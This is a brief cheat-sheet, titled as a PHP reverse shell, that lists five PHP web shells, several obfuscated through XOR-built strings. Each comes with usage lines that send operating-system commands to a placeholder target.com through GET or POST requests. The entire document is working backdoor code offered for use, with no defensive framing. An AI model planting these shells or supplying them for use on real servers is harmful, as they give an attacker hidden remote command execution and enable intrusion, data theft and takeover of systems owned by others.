PHP Reverse Shell
shortexplanation sometime soon 


#Obfuscated PHP Web Shell
save as .php

<?=`$_GET[0]`?>
Usage : 
- http://target.com/path/to/shell.php?0=command


<?=`$_POST[0]`?>
Usage : 
- curl -X POST http://target.com/path/to/shell.php -d "0=command"


<?=`{$_REQUEST['_']}`?>
Usage :
- http://target.com/path/to/shell.php?_=command
- curl -X POST http://target.com/path/to/shell.php -d "_=command" '



<?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
Usage : 
- http://target.com/path/to/shell.php?0=command



<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
Usage :
- http://target.com/path/to/shell.php?_=function&__=argument
- http://target.com/path/to/shell.php?_=system&__=ls
